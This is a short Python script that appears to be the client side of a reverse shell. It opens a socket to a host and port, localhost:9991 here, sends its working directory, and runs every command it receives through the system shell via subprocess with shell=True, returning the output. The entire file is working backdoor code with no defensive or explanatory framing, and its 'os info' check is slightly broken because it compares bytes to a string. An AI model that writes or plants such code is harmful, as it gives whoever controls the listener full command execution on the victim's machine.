import os
import socket
import subprocess
import platform

s = socket.socket()
host = 'localhost'
port = 9991
s.connect((host, port))  # the socket


def command():
    while True:
        s.send(str.encode(str(os.getcwd())))
        data = s.recv(2048)
        if len(data) > 0:
            if data == 'os info':
                osname = platform.system()
                s.send(str.encode(osname, "utf-8"))
            else:
                cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,
                                       stderr=subprocess.PIPE,
                                       stdin=subprocess.PIPE)
                output_bytes = cmd.stdout.read() + cmd.stderr.read()
                output_str = str(output_bytes, "utf-8")
                s.send(str.encode(output_str))
                print(output_str)


command()

s.close()
